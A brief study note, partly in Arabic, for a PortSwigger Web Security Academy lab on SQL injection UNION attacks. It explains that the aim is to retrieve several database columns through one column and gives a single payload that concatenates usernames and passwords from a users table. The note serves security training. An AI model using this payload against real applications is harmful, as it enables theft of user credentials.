# Lab: SQL injection UNION attack, retrieving multiple values in a single column

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

- الفكره من الLab ده انك ترجع من الdatabase اكتر من column في نفس الامر

```bash
1. 'union select null,username||'~'||password from users-- -
```
